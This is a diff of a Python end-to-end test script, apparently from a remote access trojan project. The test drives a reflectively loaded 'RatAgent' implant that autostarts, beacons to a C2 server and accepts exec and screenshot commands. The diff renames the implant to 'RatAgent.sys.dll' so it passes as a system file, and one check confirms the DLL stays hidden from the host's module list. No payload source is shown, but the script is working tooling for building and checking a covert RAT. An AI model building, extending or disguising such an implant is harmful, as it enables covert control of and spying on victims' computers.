@@ -1,6 +1,6 @@
 # e2e_rdll.py — 反射加载(RfUdrl → runpic)验收
-# 验证链路:Kali 上 `cpl link loader.spec RatAgent.dll out.bin` 产出的 PIC,由
-#   runpic 宿主执行 → RfUdrl 在进程内反射加载内嵌的 RatAgent.dll(映射/重定位/
+# 验证链路:Kali 上 `cpl link loader.spec RatAgent.sys.dll out.bin` 产出的 PIC,由
+#   runpic 宿主执行 → RfUdrl 在进程内反射加载内嵌的 RatAgent.sys.dll(映射/重定位/
 #   导入/TLS/异常目录)→ NtContinue 进 DllMain → 加载即自启 → beacon 上线 →
 #   ratctl 交互(sessions/use/sysinfo/exec/screenshot)→ 跨进程命名事件优雅停止。
 #
@@ -16,7 +16,7 @@
 #   build/e2e/out.bin                    ← Kali: scp DLL 上去后 cpl link
 #   build/bin/c2server.exe / ratctl.exe
 #   build/runpic/bin/runpic.exe          ← cmake -S tools/runpic -B build/runpic
-#   build/dll-release/bin/RatAgent.dll   ← MSBuild RatAgentDll.vcxproj -p:Configuration=Release
+#   build/dll-release/bin/RatAgent.sys.dll ← MSBuild RatAgent.sys.vcxproj -p:Configuration=Release
 import os
 import queue
 import subprocess
@@ -29,7 +29,7 @@ OUT_BIN = os.path.join(ROOT, "build", "e2e", "out.bin")
 RUNPIC = os.path.join(ROOT, "build", "runpic", "bin", "runpic.exe")
 C2 = os.path.join(ROOT, "build", "bin", "c2server.exe")
 RATCTL = os.path.join(ROOT, "build", "bin", "ratctl.exe")
-DLL = os.path.join(ROOT, "build", "dll-release", "bin", "RatAgent.dll")  # Release 形态
+DLL = os.path.join(ROOT, "build", "dll-release", "bin", "RatAgent.sys.dll")  # Release 形态
 # 模块名必须与 DLL 的 RatAgentModuleId 一致(默认 sys)——它决定 id/日志/自启文件的文件名
 # (见 client/core/module_id.h)
 MODULE = "sys"
@@ -122,7 +122,7 @@ class Shell:
 def process_modules(pid):
     """用 EnumProcessModulesEx 列出进程已加载模块名。
 
-    反射加载不会把 RatAgent.dll 挂进宿主模块表(它不在 loader 链表里),而
+    反射加载不会把 RatAgent.sys.dll 挂进宿主模块表(它不在 loader 链表里),而
     LoadLibrary 会 —— 这是区分"反射加载"和"普通加载"的硬证据。
     枚举失败返回 None(检查降级为 warn,不影响结论)。
     """
@@ -246,10 +246,10 @@ def main():
         check("beacon 已启动", "[beacon] started" in combined,
               repr(combined[-160:]))
 
-        # 反射加载 vs LoadLibrary 的硬证据:宿主模块表里没有 RatAgent.dll
+        # 反射加载 vs LoadLibrary 的硬证据:宿主模块表里没有 RatAgent.sys.dll
         mods = process_modules(runpic.pid)
         if mods is not None:
-            check("宿主模块表无 RatAgent.dll(确为反射加载)", "RatAgent.dll" not in mods,
+            check("宿主模块表无 RatAgent.sys.dll(确为反射加载)", "RatAgent.sys.dll" not in mods,
                   f"modules={len(mods)}")
         else:
             print("[warn] 枚举宿主模块失败,跳过模块表检查")
